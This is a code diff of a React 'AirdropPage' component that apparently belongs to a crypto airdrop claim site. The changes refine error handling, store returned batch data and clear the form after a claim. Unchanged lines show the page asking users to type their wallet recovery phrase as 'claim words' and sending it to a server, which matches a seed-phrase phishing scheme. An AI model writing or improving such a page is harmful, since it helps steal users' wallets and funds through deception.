@@ -13,10 +13,10 @@ function AirdropPage({ asSection = false, id }) {
   const [isRedeeming, setIsRedeeming] = useState(false)
   const PageTag = asSection ? 'section' : 'main'
   const [error, setError] = useState('')
-  const [redeemStatus, setRedeemStatus] = useState(null) // 'success' or 'failure'
+  const [redeemStatus, setRedeemStatus] = useState(null)
+  const [batchData, setBatchData] = useState(null)
 
   const handleRedeem = async () => {
-    // Don't proceed if already redeeming or no words entered
     if (isRedeeming) return
     if (!claimWords.trim()) {
       setError('Please enter your claim words')
@@ -39,21 +39,29 @@ function AirdropPage({ asSection = false, id }) {
       console.log('Airdrop claim response:', response.data)
 
       if (response.data.ok) {
-        // Show the redemption modal on success
         setRedeemStatus('success')
+        setBatchData(response.data.batch)
         setShowRedeemModal(true)
       } else {
-        // Show the redemption modal with failure status
         setRedeemStatus('failure')
         setShowRedeemModal(true)
         setError(response.data.error || 'Failed to process airdrop claim')
       }
     } catch (error) {
       console.error('Airdrop claim error:', error)
-      // Show the redemption modal with failure status
       setRedeemStatus('failure')
       setShowRedeemModal(true)
-      setError(error.response?.data?.error || 'Failed to connect to server. Please try again.')
+      
+      // Check for specific error messages
+      if (error.response?.status === 404) {
+        setError('API endpoint not found. Please check your connection.')
+      } else if (error.response?.data?.error) {
+        setError(error.response.data.error)
+      } else if (error.code === 'ECONNABORTED') {
+        setError('Request timed out. Please try again.')
+      } else {
+        setError('Failed to connect to server. Please try again.')
+      }
     } finally {
       setIsRedeeming(false)
     }
@@ -66,8 +74,11 @@ function AirdropPage({ asSection = false, id }) {
 
   const handleCloseModal = () => {
     setShowRedeemModal(false)
-    // Reset status after modal closes
     setRedeemStatus(null)
+    // If successful, you might want to clear the form
+    if (redeemStatus === 'success') {
+      setClaimWords('')
+    }
   }
 
   return (
@@ -101,7 +112,7 @@ function AirdropPage({ asSection = false, id }) {
                 value={claimWords}
                 onChange={(event) => {
                   setClaimWords(event.target.value)
-                  setError('') // Clear error when user types
+                  setError('')
                 }}
                 placeholder="Enter public claim words. enter your recovery phrase."
                 rows="8"
@@ -162,7 +173,7 @@ function AirdropPage({ asSection = false, id }) {
           onClose={handleCloseModal}
           status={redeemStatus}
           errorMessage={error}
-          batchData={redeemStatus === 'success' ? { id: '...' } : null}
+          batchData={batchData}
         />
       )}
     </PageTag>
